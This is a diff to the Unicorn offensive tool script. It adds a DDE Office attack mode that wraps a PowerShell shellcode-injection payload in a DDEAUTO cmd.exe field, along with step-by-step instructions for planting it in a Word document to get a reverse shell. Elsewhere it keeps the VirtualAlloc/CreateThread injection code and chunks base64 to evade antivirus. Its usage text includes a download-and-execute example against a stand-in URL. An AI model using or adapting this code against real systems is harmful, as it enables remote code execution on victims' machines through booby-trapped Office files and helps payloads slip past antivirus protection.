@@ -191,6 +191,44 @@ windows machine to convert it back to a binary.
 [*******************************************************************************************************]
 	""")
 
+# display dde office injection help
+def dde_help():
+    print("""
+
+[*******************************************************************************************************]
+
+                -----DDE Office COM Attack Instructions----
+
+This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object 
+DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the
+ability to gain remote code execution without the need of macros. This attack was documented and full
+instructions can be found at:
+
+https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
+
+In order to use this attack, run the following examples:
+
+python unicorn.py <payload> <lhost> <lport> dde
+python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
+
+Once generated, a powershell_attacks.txt will be generated which contains the Office code, and the
+unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
+handle the listener for the payload.
+
+In order to apply the payload, as an example (from sensepost article):
+
+1. Open Word
+2. Insert tab -> Quick Parts -> Field
+3. Choose = (Formula) and click ok.
+4. Once the field is inserted, you should now see "!Unexpected End of Formula"
+5. Right-click the Field, choose "Toggle Field Codes"
+6. Paste in the code from Unicorn
+7. Save the Word document.
+
+Once the office document is opened, you should receive a shell through powershell injection.
+
+[*******************************************************************************************************]
+    """)
 
 def custom_ps1_help():
     print("""
@@ -217,30 +255,23 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print(
-        "-------------------- Magic Unicorn Attack Vector v2.8.2 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.9 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
-    print(
-        "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
+    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
     print("Credits: Matthew Graeber, Justin Elze, Chris Gates")
     print("\nHappy Magic Unicorns.")
     print("")
-    print(
-        "Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
-    print(
-        "PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443")
-    print(
-        "PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe")
-    print(
-        "Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro")
-    print(
-        "HTA Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 hta")
+    print("Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
+    print("PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443")
+    print("PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe")
+    print("Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro")
+    print("HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta")
+    print("DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde")
     print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file>")
     print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
     print("Help Menu: python unicorn.py --help\n")
-
 
 # split string
 def split_str(s, length):
@@ -426,22 +457,16 @@ def generate_shellcode(payload, ipaddr, port):
         payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
-    repls = {
-        ';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '',
-             'unsignedcharbuf[]=': ''}
-    data = reduce(lambda a, kv: a.replace(*kv),
-                  iter(repls.items()), data).rstrip()
+    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
+    data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
 
     if len(data) < 1:
-        print(
-            "[!] Length of shellcode was not generated. Check payload name and if Metasploit is working and try again.")
+        print("[!] Shellcode was not generated for some reason. Check payload name and if Metasploit is working and try again.")
         print("Exiting....")
         sys.exit()
     return data
 
 # generate shellcode attack and replace hex
-
-
 def gen_shellcode_attack(payload, ipaddr, port):
     # regular payload generation stuff
     # generate our shellcode first
@@ -470,17 +495,17 @@ def gen_shellcode_attack(payload, ipaddr, port):
 
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
-    var1 = "$" + generate_random_string(2, 3) # $1 
-    var2 = "$" + generate_random_string(2, 3) # $c
-    var3 = "$" + generate_random_string(2, 3) # $2
-    var4 = "$" + generate_random_string(2, 3) # $3
-    var5 = "$" + generate_random_string(2, 3) # $x
-    var6 = "$" + generate_random_string(2, 3) # $t
-    var7 = "$" + generate_random_string(2, 3) # $h
-    var8 = "$" + generate_random_string(2, 3) # $z
-    var9 = "$" + generate_random_string(2, 3) # $g
-    var10 = "$" + generate_random_string(2, 3) # $i
-    var11 = "$" + generate_random_string(2, 3) # $w
+    var1 = "$" + generate_random_string(2, 2) # $1 
+    var2 = "$" + generate_random_string(2, 2) # $c
+    var3 = "$" + generate_random_string(2, 2) # $2
+    var4 = "$" + generate_random_string(2, 2) # $3
+    var5 = "$" + generate_random_string(2, 2) # $x
+    var6 = "$" + generate_random_string(2, 2) # $t
+    var7 = "$" + generate_random_string(2, 2) # $h
+    var8 = "$" + generate_random_string(2, 2) # $z
+    var9 = "$" + generate_random_string(2, 2) # $g
+    var10 = "$" + generate_random_string(2, 2) # $i
+    var11 = "$" + generate_random_string(2, 2) # $w
 
     # one line shellcode injection with native x86 shellcode
     powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-e''c ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
@@ -506,8 +531,7 @@ def gen_ps1_attack(ps1path):
 
 def format_payload(powershell_code, attack_type, attack_modifier, option):
     gen_unicorn()
-    print(
-        "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
+    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
     print("\nHappy Magic Unicorns.")
 
@@ -519,7 +543,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     # honestly anti-virus is one of the most annoying programs ever created - it has nothing to do with security, but if something becomes popular, lets write a signature that annoys the author. So in this example, we say F A/V because it's literally terrible. What AV - i.e. Kaspersky in this case was doing was evaluating the base64 encoded command - so what do we do? Chunk it up because anti-virus is absolutely ridiculous. Of course this gets around it because it doesn't know how to interpret PowerShell. Instead, what you need to be looking for is long powershell statements, toString() as suspicious, etc. That'll never happen because A/V is suppose to be signature based on something they can catch. You all literally are a dying breed. Sorry for the rant, but it's annoying to have to sit here and rewrite stupid stuff because your wrote a shitty sig. -Dave
     fuckav = base64.b64encode(powershell_code.encode('utf_16_le'))
     # here we mangle our encodedcommand by splitting it up in random chunks
-    avsux = randomint = random.randint(900,940)
+    avsux = randomint = random.randint(4000,5000)
     avnotftw = [fuckav[i: i + avsux] for i in range(0, len(fuckav), avsux)]
     haha_av = ""
     counter = 0
@@ -551,8 +575,18 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             if len(full_attack) > 8191:
                 print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
                 raw_input("Press {return} to continue.")
+                sys.exit()
+
+            # format for dde specific payload
+            if attack_modifier == "dde":
+                full_attack = ('{DDEAUTO c:\\windows\\system32\\cmd.exe ""/k %s ""  }' % (full_attack))
+
             write_file("powershell_attack.txt", full_attack)
-            ps_help()
+            if attack_modifier != "dde":
+                ps_help() # present normal powershell attack instructions
+
+            # if we are using dde attack, present that method
+            if attack_modifier == "dde": dde_help()
 
     elif attack_type == "custom_ps1":
         if attack_modifier == "macro":
@@ -596,6 +630,7 @@ try:
             hta_help()
             cert_help()
             custom_ps1_help()
+            dde_help()
             gen_usage()
             sys.exit()
         else:
